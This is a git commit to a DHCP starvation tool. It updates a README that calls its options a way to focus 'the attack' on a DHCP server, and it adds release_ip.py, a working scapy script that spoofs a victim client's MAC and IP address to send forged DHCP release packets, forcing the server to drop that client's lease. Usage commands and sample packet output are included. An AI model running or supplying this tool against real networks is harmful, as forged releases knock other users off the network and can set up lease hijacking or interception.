4e83b4873ba0cf0105962f23250d05705074f138
root <root@maker.nowhere>
2018-05-17 19:13:19 +0200

    request to release an ip

--- README.md
+++ README.md
@@ -18,7 +18,8 @@ It works better with python2
 ### Usage
 ````
 usage: starvit.py [-h] -subnet SUBNET [-start N] [-end N]
-                  [-server_id SERVER_ID] [-timeout TIMEOUT]
+                  [-server_id SERVER_ID] [-dst_mac DST_MAC] [-timeout TIMEOUT]
+                  [-debug DEBUG]
 
 sudo python starvit.py -subnet 192.168.27. -start 120 -end 150
 
@@ -29,7 +30,7 @@ sudo python starvit.py -subnet 192.168.27. -start 10 -end 253 -server_id 192.168
 python starvit.py -subnet 192.168.1. -start 80 -end 100 -dst_mac 08:00:27:7C:F9:41 -debug 1
 ````
 
-### example stdout
+#### example stdout with -debug 1
 ````
 Requesting: 192.168.1.98
 <Ether  dst=08:00:27:7C:F9:41 src=7b:7b:d1:5a:6b:62 type=IPv4 |<IP  frag=0 proto=udp src=0.0.0.0 dst=255.255.255.255 |<UDP  sport=bootpc dport=bootps |<BOOTP  chaddr=<RandMAC> options='c\x82Sc' |<DHCP  options=[message-type='request' requested_addr=192.168.1.98 end] |>>>>>
@@ -37,11 +38,19 @@ Requesting: 192.168.1.98
 Sent 1 packets.
 ````
 
-#### -server_id
-This option focus the attack on a specified endpoint, the DHCP server.
-All the other DHCP server in the l2 broadcast will get something similar in their logs and will not release any ip from their pool.
+#### -server_id and -dst_mac
+These options focus the attack on a specified endpoint, the DHCP server, by ip or mac address.
+
+If you using a wrong server_id value all the DHCP servers in the l2 broadcast will get something similar in their logs and will not release any ip from their pool.
 ````
 Wed May 16 17:31:35 2018 daemon.info dnsmasq-dhcp[31796]: DHCPNAK(br-lan) 192.168.27.135 30:63:3a:33:38:3a wrong server-ID
+````
+
+### Request an IP release
+Usefull if you want to force a DHCP server to remove a DHCP lease and then make a client to request an ip again
+````
+python release_ip.py -src_mac 66:36:3a:37:31:3a -src_ip 192.168.1.93 -dst_mac 08:00:27:7C:F9:41 -dst_ip 192.168.1.1 -debug 1
+
 ````
 
 ### Hints
---
+++ release_ip.py
@@ -0,0 +1,59 @@
+#!/usr/bin/env python3
+# Giuseppe De Marco
+
+from scapy.all import *
+
+def release_ip(src_mac,
+               dst_mac,
+               src_ip,
+               dst_ip,
+               timeout=0.2,
+               debug=0):
+    rand_xid=random.randint(1, 900000000)
+    
+    dhcp_release = Ether(src=src_mac,dst=dst_mac)\
+                   /IP(src=src_ip,dst=dst_ip)\
+                   /UDP(sport=68,dport=67)\
+                   /BOOTP(ciaddr=src_ip,chaddr=[mac2str(src_mac)],xid=rand_xid,)\
+                   /DHCP(options=[("message-type","release"),
+                                  ("server_id",dst_ip),
+                                  ("client_id",chr(1),
+                                  mac2str(src_mac)),
+                                  "end"])
+    sendp(dhcp_release)
+    print("Requesting release for: %s (%s)" % (src_ip, src_mac))
+    if debug: print('%r'%dhcp_release)
+    time.sleep(timeout)
+
+           
+if __name__=="__main__":
+    import argparse
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-src_mac', required=True, 
+                        help="source macaddr of the client of the requested ip to release")
+
+    parser.add_argument('-src_ip', required=True, 
+                        help="source ip addr of the client to release")
+
+    parser.add_argument('-dst_mac', default="ff:ff:ff:ff:ff:ff", required=False, 
+                        help="Destination DHCP MAC address, default: ff:ff:ff:ff:ff:ff")
+
+    parser.add_argument('-dst_ip', required=True, 
+                        help="DHCP server IP where releases have to been requested")
+
+    parser.add_argument('-timeout', type=float, default=0.2, required=False, 
+                        help="seconds to wait between a request and another. example -timeout 0.2")
+
+    parser.add_argument('-debug', type=int, default=0,
+                        help="print packets", required=False)
+
+    args = parser.parse_args()
+    
+    # run!
+    release_ip( args.src_mac,
+                args.dst_mac,
+                args.src_ip,
+                args.dst_ip,
+                args.timeout,
+                args.debug)
+    
